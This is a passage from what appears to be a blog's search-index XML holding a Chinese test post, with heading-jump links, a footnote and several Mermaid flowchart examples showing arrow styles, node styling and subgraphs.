The snowflakes fell on her long, fair hair, which hung in curls on her shoulders, but she regarded them not.</p>
<p><a href="#二级标题">标题跳转</a></p>
<h2 id="往我这里跳"><a href="#往我这里跳" class="headerlink" title="往我这里跳"></a>往我这里跳</h2><p>注释2<sup><a href="#fn_中文注释" id="reffn_中文注释">中文注释</a></sup></p>
<p><a href="#六级标题">往我这跳之标题跳转</a></p>
<pre class="mermaid">graph TD
    A((Root))
    A --> B((Left Child))
    A --> C((Right Child))
    B --> D((Left Grandchild))
    B --> E((Right Grandchild))
    C --> F((Left Grandchild))
    C --> G((Right Grandchild))</pre>

<pre class="mermaid">graph TD;

A1-.-B1

A2---B2

A3===B3</pre>

<pre class="mermaid">graph TB

A1-.虚线文字.-B1

A2-.虚线文字.->B2

A3--实线文字---B3

A4--实线文字-->B4

A5==粗线文字===B5

A6==粗线文字==>B6</pre>

<p><a href="#往我这里跳">标题跳转</a></p>
<pre class="mermaid">graph LR
    %% flowchart改为graph也可以
    %% 风格1，用红色填充，边框用蓝色，边框宽度两个像素
    classDef mystyle1 fill:#f00, stroke:#00f, stroke-width:2px;
    classDef mystyle2 fill:#0f0, stroke:#f00, stroke-width:4px;
    classDef mystyle3 fill:#00f, stroke:#0f0, stroke-width:8px,color:#fff,stroke-dasharray: 6 3
    classDef default fill:#f9f,stroke:#333,stroke-width:4px;
    %% :::表示继承类（风格）
    D[(默认风格)]
    B(绿色填充<br>红边框<br>圆角):::mystyle2 --> D
    C[蓝色填充<br>绿色边框<br>白色字体]:::mystyle3 --> D
    %% D默认为default风格

    e((显示特别<br>的符号)) -->|"f(,.?!+-\*ز)"| f(,.?!+-\*ز)

    C --> b2
    subgraph subgraph1
        a1{"{菱形}"} --- a2[/"[/梯形\]"\]
    end
    subgraph subgraph2
        b1[["[[xxx]]"]] -->|子图内部元<br>素的连接| b2(["([圆角])"])
    end
    %% graph图形是不能在子图之间进行连接，但是子图内部的元素还是可以
    %% subgraph1 --> subgraph2
    %% a1 -->|子图元素<br>之间的连接| b1</pre>

<pre class="mermaid">graph TB
    A --> B
    subgraph 子图1 [TB方向]        
        B --> C
        C --> D
    end
    subgraph 子图2 [LR方向]

        subgraph 子图21 21
            D --> E
            E --> F
        end
        subgraph 子图21 22
            DD --> EE
            EE --> FF
        end
    end
    F --> G</pre>

]]></content>
      <categories>
        <category>测试</category>
      </categories>
      <tags>
        <tag>测试</tag>
      </tags>
  </entry>
</search>
